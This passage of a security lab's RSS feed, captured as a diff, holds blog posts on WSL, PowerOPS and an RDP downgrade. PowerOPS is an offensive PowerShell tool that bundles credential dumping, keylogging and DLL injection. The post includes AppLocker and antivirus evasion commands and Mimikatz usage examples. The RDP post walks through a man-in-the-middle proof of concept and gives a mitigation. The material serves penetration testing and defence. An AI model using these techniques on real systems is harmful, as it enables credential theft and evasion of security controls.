+<p>The design of WSL seems to be relatively robust if slightly odd, however time will tell, particularly if offensive teams pick up the whiff of a new opportunity. If nothing else, take this article as a reminder that WSL should not be considered a security boundary and that it will remain unmanaged irrespective of how you administer your Windows hosts.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/">Exploring Windows Subsystem for Linux</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/exploring-windows-subsystem-for-linux/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>PowerOPS: PowerShell for Offensive Operations</title>
+		<link>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/</link>
+		<comments>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/#comments</comments>
+		<pubDate>Fri, 03 Jun 2016 12:17:41 +0000</pubDate>
+		<dc:creator><![CDATA[RFR]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5467</guid>
+		<description><![CDATA[<p>At Portcullis, one of the most frequent assessments we perform are breakouts. One of the main challenges we face during these assessments is to get command execution that can either help escalate our privileges or allow us to gain access to different systems on the network. Sometimes we find harsh group policy restrictions in place [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/">PowerOPS: PowerShell for Offensive Operations</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>At Portcullis, one of the most frequent assessments we perform are breakouts. One of the main challenges we face during these assessments is to get command execution that can either help escalate our privileges or allow us to gain access to different systems on the network. <span id="more-5467"></span></p>
+<p>Sometimes we find harsh group policy restrictions in place that block access to the Windows Command Prompt, PowerShell, among others. These, however, are not always properly implemented, i.e. they do not block access to all executables (and allow only certain programs to run).</p>
+<p>After getting command execution, we want to attack other systems on the network. However it isn&#8217;t always easy to get a flexible toolbox in the system that allow us to gather information and launch further attacks. PowerShell is our preferred post-exploitation language and powershell.exe access is usually blocked (as .ps1 scripts). However since the block is often incorrectly implemented, i.e. the DLLs used by PowerShell aren&#8217;t usually blocked, this can open some doors. On top of that some AVs started implementing some basic signatures that will pick some well known PowerShell scripts. The bypass is trivial but we want to be as stealthy as possible and it still delay us a bit. </p>
+<p>How can we bypass some of these &#8220;security mitigations&#8221; and speed up our tests? PowerOPS is an application written in C# that does not rely on powershell.exe but runs PowerShell commands and functions within a PowerShell runspace environment (.NET). Besides this, it includes multiple offensive PowerShell modules to make the process of post-exploitation easier.</p>
+<p>It tries to follow the KISS principle, being as simple as possible. The main goal is to make it easy to use PowerShell offensively and help to evade Anti-Virus and other mitigations.</p>
+<p>To do this, it:</p>
+<ul>
+<li>Doesn&#8217;t rely on powershell.exe, it calls PowerShell directly through the .NET framework, which might help bypassing security controls like GPO, SRP and App Locker</li>
+<li>Powershell functions within the Runspace are loaded in memory from Base64 Encoded Strings and never touch disk, evading most Anti-Virus engines</li>
+</ul>
+<h2>What’s inside the runspace?</h2>
+<p><a title="PowerShellMafia/Powersploit" href="https://github.com/PowerShellMafia/PowerSploit">PowerShellMafia/Powersploit</a></p>
+<ul>
+<li>Get-Keystrokes</li>
+<li>Invoke-DllInjection</li>
+<li>Invoke-Mimikatz</li>
+<li>Invoke-NinjaCopy</li>
+<li>Invoke-Shellcode</li>
+<li>Invoke-ReflectivePEInjection</li>
+<li>Invoke-TokenManipulation</li>
+<li>Invoke-WMICommand</li>
+<li>PowerUp</li>
+<li>PowerView</li>
+</ul>
+<p><a title="Nishang" href="https://github.com/samratashok/nishang">Nishang</a></p>
+<ul>
+<li>Get-Information</li>
+<li>Get-PassHashes</li>
+<li>Port-Scan</li>
+</ul>
+<p><a title="Auto-GPPPassword" href="https://github.com/roo7break/PowerShell-Scripts/blob/master/auto-gpppassword/auto-gpppassword.ps1">Auto-GPPPassword</a></p>
+<p><a title="PowerCat" href="https://github.com/besimorhino/powercat">PowerCat</a></p>
+<p><a title="Get-ProductKey" href="https://gallery.technet.microsoft.com/scriptcenter/Get-product-keys-of-local-83b4ce97">Get-ProductKey</a></p>
+<p><a title="Empire" href="https://github.com/PowerShellEmpire/">Empire</a></p>
+<ul>
+<li>Invoke-Psexec</li>
+<li>Invoke-SSHCommand</li>
+</ul>
+<p>Additionally you can run any valid PowerShell command.</p>
+<h2>Where to get it?</h2>
+<p>The source code is available at <a title="GitHub" href="https://github.com/fdiskyou/PowerOPS">GitHub</a>.</p>
+<h2>How to compile it</h2>
+<p>To compile PowerOPS you need to import this project within Microsoft Visual Studio or if you don&#8217;t have access to a Visual Studio installation, you can compile it as follows:</p>
+<p>To compile it as an x86 binary:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+C:\&gt; cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\&gt; csc.exe /unsafe /reference:&quot;C:\path\to\System.Management.Automation.dll&quot; /reference:System.IO.Compression.dll /out:C:\users\username\PowerOPS_x86.exe /platform:x86 &quot;C:\path\to\PowerOPS\PowerOPS\*.cs&quot;
+</pre>
+<p>To compile it as an x64 binary:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+C:\&gt; cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\&gt; csc.exe /unsafe /reference:&quot;C:\path\to\System.Management.Automation.dll&quot; /reference:System.IO.Compression.dll /out:C:\users\username\PowerOPS_x64.exe /platform:x64 &quot;C:\path\to\PowerOPS\PowerOPS\*.cs&quot;
+</pre>
+<p>PowerOPS uses the System.Management.Automation namespace, so make sure you have the System.Management.Automation.dll within your source path when compiling outside of Visual Studio.</p>
+<h2>How to use it</h2>
+<p>Just run the binary and type show to list available modules.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; show
+
+[-] This computer is not part of a Domain! Some functions will not work!
+
+[+] Nishang
+
+ Get-Information    Get-PassHashes             Port-Scan
+
+[+] PowerSploit
+
+ Get-KeyStrokes     Invoke-DllInjection        Invoke-Mimikatz     Invoke-NinjaCopy
+ Invoke-Shellcode   Invoke-TokenManipulation   Invoke-WmiCommand   Invoke-ReflectivePEInjection
+ PowerView          PowerUp
+
+[+] Empire
+
+ Invoke-PsExec      Invoke-SSHCommand
+
+[+] Others
+
+ Auto-GPPPassword   Get-ProductKey             PowerCat
+
+PS &gt;
+</pre>
+<p>PowerUp and PowerView are loaded as modules, so Get-Command -module will show you all available functions.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; get-command -module powerup
+
+CommandType     Name                                               ModuleName
+-----------     ----                                               ----------
+Function        Find-DLLHijack                                     PowerUp
+Function        Find-PathHijack                                    PowerUp
+Function        Get-ApplicationHost                                PowerUp
+Function        Get-ModifiableFile                                 PowerUp
+Function        Get-RegAlwaysInstallElevated                       PowerUp
+Function        Get-RegAutoLogon                                   PowerUp
+Function        Get-ServiceDetail                                  PowerUp
+Function        Get-ServiceFilePermission                          PowerUp
+Function        Get-ServicePermission                              PowerUp
+Function        Get-ServiceUnquoted                                PowerUp
+Function        Get-UnattendedInstallFile                          PowerUp
+Function        Get-VulnAutoRun                                    PowerUp
+Function        Get-VulnSchTask                                    PowerUp
+Function        Get-Webconfig                                      PowerUp
+Function        Install-ServiceBinary                              PowerUp
+Function        Invoke-AllChecks                                   PowerUp
+Function        Invoke-ServiceAbuse                                PowerUp
+Function        Invoke-ServiceDisable                              PowerUp
+Function        Invoke-ServiceEnable                               PowerUp
+Function        Invoke-ServiceStart                                PowerUp
+Function        Invoke-ServiceStop                                 PowerUp
+Function        Restore-ServiceBinary                              PowerUp
+Function        Test-ServiceDaclPermission                         PowerUp
+Function        Write-HijackDll                                    PowerUp
+Function        Write-ServiceBinary                                PowerUp
+Function        Write-UserAddMSI                                   PowerUp
+
+PS &gt;
+</pre>
+<p>All your PowerShell fu applies. PowerOPS is basically a PowerShell shell with some modules/functions pre-loaded. So Get-Help is your friend and will help you to understand how the modules can be used.</p>
+<p>Let&#8217;s say you want to see examples on how to use Invoke-Mimikatz.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; Get-Help Invoke-Mimikatz -examples
+
+NAME
+    Invoke-Mimikatz
+
+SYNOPSIS
+    This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to
+    reflectively load Mimikatz completely in memory. This allows you to do
+    things such as
+    dump credentials without ever writing the mimikatz binary to disk.
+    The script has a ComputerName parameter which allows it to be executed
+    against multiple computers.
+
+    This script should be able to dump credentials from any version of Windows
+    through Windows 8.1 that has PowerShell v2 or higher installed.
+
+    Function: Invoke-Mimikatz
+    Author: Joe Bialek, Twitter: @JosephBialek
+    Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog:
+    http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter
+    @gentilkiwi
+    License:  http://creativecommons.org/licenses/by/3.0/fr/
+    Required Dependencies: Mimikatz (included)
+    Optional Dependencies: None
+    Version: 1.5
+    ReflectivePEInjection version: 1.1
+    Mimikatz version: 2.0 alpha (2/16/2015)
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS&gt;Execute mimikatz on the local computer to dump certificates.
+
+
+    Invoke-Mimikatz -DumpCerts
+
+
+    -------------------------- EXAMPLE 2 --------------------------
+
+    C:\PS&gt;Execute mimikatz on two remote computers to dump credentials.
+
+
+    Invoke-Mimikatz -DumpCreds -ComputerName @(&quot;computer1&quot;, &quot;computer2&quot;)
+
+
+    -------------------------- EXAMPLE 3 --------------------------
+
+    C:\PS&gt;Execute mimikatz on a remote computer with the custom command
+    &quot;privilege::debug exit&quot; which simply requests debug privilege and exits
+
+
+    Invoke-Mimikatz -Command &quot;privilege::debug exit&quot; -ComputerName &quot;computer1&quot;
+
+
+PS &gt;
+</pre>
+<p>Or simply look at the whole help available for Invoke-DllInjection.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; Get-Help Invoke-DllInjection -full
+
+NAME
+    Invoke-DllInjection
+
+SYNOPSIS
+    Injects a Dll into the process ID of your choosing.
+
+    PowerSploit Function: Invoke-DllInjection
+    Author: Matthew Graeber (@mattifestation)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+SYNTAX
+    Invoke-DllInjection [-ProcessID] &lt;Int32&gt; [-Dll] &lt;String&gt;
+    [&lt;CommonParameters&gt;]
+
+
+DESCRIPTION
+    Invoke-DllInjection injects a Dll into an arbitrary process.
+
+
+PARAMETERS
+    -ProcessID &lt;Int32&gt;
+        Process ID of the process you want to inject a Dll into.
+
+        Required?                    true
+        Position?                    1
+        Default value                0
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -Dll &lt;String&gt;
+        Name of the dll to inject. This can be an absolute or relative path.
+
+        Required?                    true
+        Position?                    2
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    &lt;CommonParameters&gt;
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer, PipelineVariable, and OutVariable. For more information, see
+        about_CommonParameters (http://go.microsoft.com/fwlink/?LinkID=113216).
+
+INPUTS
+
+OUTPUTS
+
+NOTES
+        Use the '-Verbose' option to print detailed information.
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS&gt;Invoke-DllInjection -ProcessID 4274 -Dll evil.dll
+
+
+    Description
+    -----------
+    Inject 'evil.dll' into process ID 4274.
+
+RELATED LINKS
+
+http://www.exploit-monday.com
+
+PS &gt;
+</pre>
+<p>You can play around with the output&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; get-productkey
+
+OSDescription        Computername        OSVersion           ProductKey
+-------------        ------------        ---------           ----------
+Microsoft Windows... VISUALSTUDIO        6.1.7601            ABCDE-54321-UVXY...
+
+
+
+PS &gt; get-productkey | format-list
+
+
+OSDescription : Microsoft Windows 7 Professional N
+Computername  : VISUALSTUDIO
+OSVersion     : 6.1.7601
+ProductKey    : ABCDE-54321-UVXYZ-12345-LMNOP
+</pre>
+<p>Save the output of your commands the way you want&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; invoke-allchecks | Out-File -Encoding ascii powerup.output.txt
+
+PS &gt; type powerup.output.txt
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+[*] Checking for unquoted service paths...
+
+[*] Checking service executable and argument permissions...
+
+[*] Checking service permissions...
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+[*] Checking for Autologon credentials in registry...
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+[*] Checking for vulnerable schtask files/configs...
+
+[*] Checking for unattended install files...
+
+[*] Checking for encrypted web.config strings...
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+PS &gt;
+</pre>
+<p>Do some math&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; $a=1
+
+PS &gt; $b=4
+
+PS &gt; $c=$a+$b
+
+PS &gt; echo $c
+5
+</pre>
+<p>Browse the file system&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+PS &gt; cd c:\
+
+PS &gt; ls
+
+    Directory: C:\
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----        14/02/2016     17:21            bin
+d----        17/02/2016     15:02            Dev-Cpp
+d----        14/07/2009     04:20            PerfLogs
+d-r--        26/04/2016     20:00            Program Files
+d-r--        26/04/2016     20:00            Program Files (x86)
+d----        19/02/2016     21:06            Python27
+d-r--        26/11/2015     17:20            Users
+d----        12/05/2016     15:53            Windows
+-a---        19/03/2010     23:55    2073703 VS_EXPBSLN_x64_enu.CAB
+-a---        19/03/2010     23:58     551424 VS_EXPBSLN_x64_enu.MSI
+
+PS &gt; pwd
+
+Path
+----
+C:\
+
+PS &gt;
+</pre>
+<p>And so on&#8230;</p>
+<p><a title="PowerShell v5" href="https://mva.microsoft.com/en-US/training-courses/what-s-new-in-powershell-v5-16434">PowerShell v5</a> is coming with some new security features that will certainly affect some of the payloads contained in PowerOPS, so further development is expected as well as addition of new attack modules.</p>
+<h3>AppLocker bypass</h3>
+<p>PowerOPS includes the InstallUtil AppLocker bypass technique from <a title="Casey Smith" href="https://twitter.com/subTee">Casey Smith</a>. To make use of it run as shown below:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+C:\&gt; cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\&gt; InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\PowerOPS.exe
+</pre>
+<h4>Credits</h4>
+<p>PowerOPS was inspired by <a title="Cn33liz/p0wnedShell" href="https://github.com/Cn33liz/p0wnedShell">Cn33liz/p0wnedShell</a>, and basically consists of work from <a title="Nikhil Mittal" href="http://www.labofapenetrationtester.com/">Nikhil Mittal</a> of Nishang, <a title="mattifiestation" href="https://twitter.com/mattifestation">mattifiestation</a> of PowerSploit and <a title="sixdub" href="https://twitter.com/sixdub">sixdub</a>, <a title="engima0x3" href="https://twitter.com/enigma0x3">engima0x3</a> and <a title="harmj0y" href="https://twitter.com/HarmJ0y">harmj0y</a> of Empire.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/">PowerOPS: PowerShell for Offensive Operations</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Downgrading RDP connections and how to avoid it</title>
+		<link>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/</link>
+		<comments>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/#comments</comments>
+		<pubDate>Fri, 22 Apr 2016 15:18:17 +0000</pubDate>
+		<dc:creator><![CDATA[MRL]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[cryptography]]></category>
+		<category><![CDATA[MiTM]]></category>
+		<category><![CDATA[RDP]]></category>
+		<category><![CDATA[red team]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=1488</guid>
+		<description><![CDATA[<p>This post describes how Remote Desktop Protocol (RDP) connections can be vulnerable to a downgrade attack if Terminal Servers are configured insecurely. We&#8217;re not aware of this issue being discussed before &#8211; googling only found pages about installing an earlier version of the RDP client, not about downgrading the protocol in the way described here. [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/">Downgrading RDP connections and how to avoid it</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>This post describes how Remote Desktop Protocol (RDP) connections can be vulnerable to a downgrade attack if Terminal Servers are configured insecurely.<span id="more-1488"></span></p>
+<p>We&#8217;re not aware of this issue being discussed before &#8211; googling only found pages about installing an earlier version of the RDP client, not about downgrading the protocol in the way described here.  We suspect that it&#8217;s a known limitation of the protocol.  But it&#8217;s one that we though would be interesting to post about.</p>
+<p>In this post we provide a demonstration of such a downgrade attack using the aptly named PoC tool rdp-downgrade.py.</p>
+<h2>RDP Security Layer</h2>
+<p>Before discussing the downgrade attack, we should outline what we&#8217;ll be downgrading from and to.</p>
+<p>The following Security Layers are available in the RDP protocol. Support for each can be configured on the Terminal Server:</p>
+<ul>
+<li>Classic RDP Protocol - this is known as &#8220;RDP Security Layer&#8221; in the tscc.msc configuration tool and PROTOCOL_RDP in the <a title="protocol specification" href="http://msdn.microsoft.com/en-us/library/cc240445.aspx">protocol specification</a> (see page 40 of PDF)</li>
+<li>SSL - this is labelled &#8220;SSL&#8221; or &#8220;SSL (TLS 1.0)&#8221; in the GUI and called PROTOCOL_SSL in the protocol specification</li>
+<li>CredSSP - this is what you get when you check the &#8221;Network Layer Authentication&#8221; box. It also uses uses SSL. It is called PROTOCOL_HYBRID in protocol specification</li>
+</ul>
+<p>The first option is the insecure one. If this protocol were to be negotiated, the connection would be vulnerable to a <a title="well known &quot;Man-In-The-Middle&quot; attack" href="http://www.oxid.it/ca_um/topics/apr-rdp.htm">well known &#8220;Man-In-The-Middle&#8221; attack</a>.  Essentially, someone carrying out this attack would be able to see all your key strokes and any other data passed between client and server. This will therefore be the protocol we&#8217;ll be downgrading to.</p>
+<p>The last two options are both SSL-wrapped and are more secure.  It will be these protocols that we&#8217;ll be downgrading from.</p>
+<h2>How to tell which security layer you connected with</h2>
+<p>The various warnings displayed by the Terminal Services client, mstsc.exe can be used as a crude way to identify which protocol is being used.</p>
+<h3>Classic RDP</h3>
+<p>Note that the warning message about not being able to authenticate the server tallies with the MiTM attack described above.</p>
+<div id="attachment_1497" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1489"><div class="lb-album"><a href="#image-1489"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp-300x180.jpg" alt="classic-rdp" class="size-medium wp-image-1497"><span></span></a></div>              
+<a href="#imageclose-1489" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1489">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp.jpg" alt="image-1489">
+                   </div></a><p class="wp-caption-text">Warning For Classic RDP Connections</p></div>
+<h3>SSL</h3>
+<p>Unless you&#8217;ve configured your host to trust the SSL certificate of the RDP server, you&#8217;ll see a certificate warning like this one:</p>
+<div id="attachment_1496" style="width: 267px" class="wp-caption alignnone"><a name="imageclose-1490"><div class="lb-album"><a href="#image-1490"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/ssl-warning-257x300.png" alt="ssl-warning" class="size-medium wp-image-1496"><span></span></a></div>              
+<a href="#imageclose-1490" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1490">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/ssl-warning.png" alt="image-1490">
+                   </div></a><p class="wp-caption-text">Warning for (Non-CredSSP) SSL Connections</p></div>
+<h3>CredSSP (NLA + SSL)</h3>
+<p>You get prompted for your username and password by a pop-up window &#8211; whereas Classic RDP and SSL both use a full Windows Desktop for password entry.</p>
+<div id="attachment_1498" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1491"><div class="lb-album"><a href="#image-1491"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/gaejegba-300x255.png" alt="gaejegba" class="size-medium wp-image-1498"><span></span></a></div>              
+<a href="#imageclose-1491" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1491">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/gaejegba.png" alt="image-1491">
+                   </div></a><p class="wp-caption-text">Dialogue Box For NLA Connections</p></div>
+<h2>Vulnerable configuration</h2>
+<p>Terminal Servers set to negotiate their Security Layer are potentially vulnerable to a downgrade attack. Here we view the settings on a Windows 2003 server, but this also holds for newer versions of Windows:</p>
+<p><a name="imageclose-1492"><div class="lb-album"><a href="#image-1492"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-vulnerable-300x235.png" alt="2003-rdp-setting-vulnerable" class="alignnone size-medium wp-image-1491"><span></span></a></div>              
+<a href="#imageclose-1492" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1492">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/2003-rdp-setting-vulnerable.png" alt="image-1492">
+                   </div></a></p>
+<h2>The downgrade attack</h2>
+<p>We will connect to a Windows 2003 RDP server configured to &#8220;Negotiate&#8221; its Security Layer.  We&#8217;ll connect from a modern windows system that supports Classic RDP, SSL and NLA. This server only supports Classic RDP and SSL. As we&#8217;d hope, the two will normally negotiate the most secure option supported by both: SSL.</p>
+<p>During this attack we will modify network traffic to make the server believe the client only supports Classic RDP. We could intercept traffic using ARP-poisoning or DNS spoofing or some other method.</p>
+<p>After connecting to TCP port 3389, the client (mstsc) sends data similar to the following (shown in hex):</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+03 00 00 13 0e e0 00 00 00 00 00 01 00 08 00 *03* 00 00 00
+</pre>
+<p>The 03 is the protocols supported by the client. Several values are possible in this position:</p>
+<ul>
+<li>00 &#8211; Only Classic RDP is supported</li>
+<li>01 &#8211; SSL is supported in addition to Classic RDP.</li>
+<li>03 &#8211; CredSSP is supported in addition to the other two protocols.</li>
+</ul>
+<p>This is described on page 37 of the <a title="protocol specification" href="http://msdn.microsoft.com/en-us/library/cc240445.aspx">protocol specification</a>.</p>
+<p>So our proof-of-concept simply replaces the 03 with 00 to cause the client and server to negotiate Classic RDP instead of SSL.</p>
+<p>We set our tool listening on 192.168.190.170 on TCP port 3389. We instruct it to forward traffic to 192.168.2.96.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+$ python rdp-downgrade.py 192.168.2.96
+[Proxy] Listening for connections on 0.0.0.0:3389
+</pre>
+<p>Rather than actually doing ARP-spoofing, I just connect directly to the &#8220;Man-In-The-Middle&#8221; in this demo:</p>
+<div style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1493"><div class="lb-album"><a href="#image-1493"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rdp-attack-prior-to-logon-300x177.jpg" alt="rdp-attack-prior-to-logon" ><span></span></a></div>              
+<a href="#imageclose-1493" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1493">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/rdp-attack-prior-to-logon.jpg" alt="image-1493">
+                   </div></a><p class="wp-caption-text">Attacker IP Address Is Entered</p></div>
+<p>Back in our PoC tool, we then see an incoming connection from the RDP client (192.168.190.1) and the proxy making an outgoing connection to the target server:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+[Proxy] Incoming connection from 192.168.190.1:58715
+[Proxy] New outgoing request to 192.168.2.96:3389
+[Proxy] Connected
+</pre>
+<p>Next we see 19 bytes from the client &#8211; note the 03 near the end of the data from the client. This is recognised by our PoC tool and it prints a message to inform us the 03 has been changed to 00:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+[From 192.168.190.1] Received 19 bytes
+0000 03 00 00 13 0E E0 00 00 00 00 00 01 00 08 00 03 ................
+0010 00 00 00 ...
+[From 192.168.190.1] Modified data to downgrade connection
+</pre>
+<p>Then we see traffic flow freely without further modification:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate">
+[From 192.168.2.96] Received 19 bytes
+0000 03 00 00 13 0E D0 00 00 12 34 00 02 00 08 00 00 .........4......
+0010 00 00 00 ...
+...snip...
+</pre>
+<p>mstsc shows us the warning message corresponding to a Classic RDP connection, proving that the downgrade has been successful &#8211; remember that we would normally expect a certificate warning for the SSL-wrapped RDP connection.</p>
+<div id="attachment_1497" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-1489"><div class="lb-album"><a href="#image-1489"><img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp-300x180.jpg" alt="classic-rdp" class="size-medium wp-image-1497"><span></span></a></div>              
+<a href="#imageclose-1489" class="css3lightbox-close">
+				   <div class="lb-overlay" id="image-1489">
+                   <img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/08/classic-rdp.jpg" alt="image-1489">
+                   </div></a><p class="wp-caption-text">Warning Message For Classic RDP Connection</p></div>
+<h2>Conclusion</h2>
+<p>Configuring the Terminal Server to use SSL for it security layer instead of &#8220;Negotiate&#8221; prevents such a downgrade attack.</p>
+<h2>Vendor contact</h2>
+<p>We were not sure if Microsoft would consider this worthy of a security advisory. We didn&#8217;t think so, but sent them a preview of this post before publishing and asked.</p>
+<p>Microsoft who responded swiftly to confirm that &#8220;After researching the issue, we consider this behavior to be By Design&#8221;. They thanked us for our commitment to co-ordinated disclosure and gave their blessing to proceed with publication.</p>
+<p>The post <a href="https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/">Downgrading RDP connections and how to avoid it</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></content:encoded>
+			<wfw:commentRss>https://labs.portcullis.co.uk/blog/downgrading-rdp-connections-and-how-to-avoid-it/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Windows Named Pipes: There and back again</title>
+		<link>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/</link>
+		<comments>https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/#comments</comments>
+		<pubDate>Fri, 20 Nov 2015 14:04:20 +0000</pubDate>
+		<dc:creator><![CDATA[ACD]]></dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[SDL]]></category>
+		<category><![CDATA[training]]></category>
+		<category><![CDATA[Windows]]></category>
+
+		<guid isPermaLink="false">https://labs.portcullis.co.uk/?p=5378</guid>
+		<description><![CDATA[<p>Inter Process Communication (IPC) is an ubiquitous part of modern computing. Processes often talk to each other and many software packages contain multiple components which need to exchange data to run properly. Named pipes are one of the many forms of IPC in use today and are extensively used on the Windows platform as a [&#8230;]</p><p>The post <a href="https://labs.portcullis.co.uk/blog/windows-named-pipes-there-and-back-again/">Windows Named Pipes: There and back again</a> appeared first on <a href="https://labs.portcullis.co.uk">Portcullis Labs</a>.</p>]]></description>
+				<content:encoded><![CDATA[<p>Inter Process Communication (IPC) is an ubiquitous part of modern computing. Processes often talk to each other and many software packages contain multiple components which need to exchange data to run properly. Named pipes are one of the many forms of IPC in use today and are extensively used on the Windows platform as a means to exchange data between running processes in a semi-persistent manner.<span id="more-5378"></span></p>
+<p>On Windows, named pipes operate in a server-client model and can make use of the Windows Universal Naming Convention (UNC) for both local and remote connections.</p>
+<p>Named pipes on Windows use what is known as the Named Pipe File System (NPFS). The NPFS is a hidden partition which functions just like any other; files are written, read and deleted using the same mechanisms as a standard Windows file system. So named pipes are actually just files on a hard drive which persist until there are no remaining handles to the file, at which point the file is deleted by Windows.</p>
+<p>The named pipe directory is located at: \\&lt;machine_address&gt;\pipe\&lt;pipe_name&gt;</p>
+<p>There are many easy ways to read the contents of the local NPFS: Powershell, Microsoft SysInternals Process Explorer and Pipelist as well as numerous third party tools.</p>
+<p>It&#8217;s also very easy to implement in a language such as C#, with a basic read all of the named pipes directory being as simple as:</p>
+<pre class="brush: csharp; gutter: false; title: ; notranslate">
+System.IO.Directory.GetFiles(@&quot;\\.\pipe\&quot;);
+</pre>
+<h2>Exploitation of named pipes</h2>
+<p>Named pipes were introduced with NT and have been known to be vulnerable to a number of attacks over the years, especially once full support was adopted with Windows 2000. For example, the Service Control Manager (SCM) of Windows was discovered to be vulnerable to race conditions related to Named Pipes in 2000, more recently, a predictable named pipe used by Google Chrome could be exploited to help escape from the browser sandbox.</p>
+<p>To date,the most common way to exploit named pipes to gain privileges on a system has been to abuse the impersonation token granted to the named pipe server to act on behalf of a connected client.</p>
